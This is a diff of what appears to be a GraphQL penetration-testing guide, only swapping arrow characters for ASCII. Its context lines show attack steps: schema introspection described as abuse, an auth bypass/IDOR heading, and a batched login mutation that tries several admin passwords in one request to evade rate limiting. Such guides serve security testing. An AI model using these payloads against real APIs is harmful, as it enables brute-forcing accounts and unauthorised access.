@@ -17,7 +17,7 @@ Try the universal query:
 ```graphql
 {__typename}
 ```
-Returns `{"data": {"__typename": "Query"}}` → GraphQL confirmed.
+Returns `{"data": {"__typename": "Query"}}` -> GraphQL confirmed.
 
 #### STEP 2: INTROSPECTION ABUSE
 
@@ -28,7 +28,7 @@ query {
   }
 }
 ```
-→ Dumps the entire schema: all types, fields, mutations, subscriptions, deprecated fields.
+-> Dumps the entire schema: all types, fields, mutations, subscriptions, deprecated fields.
 
 #### STEP 3: AUTH BYPASS / IDOR
 
@@ -47,7 +47,7 @@ query {
  {"query": "mutation { login(user:\"admin\",pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"pass3\") { token } }"}]
 ```
-→ 3 login attempts in 1 HTTP request, bypassing rate limiting.
+-> 3 login attempts in 1 HTTP request, bypassing rate limiting.
 
 #### STEP 5: ALIAS-BASED BRUTE-FORCE
 
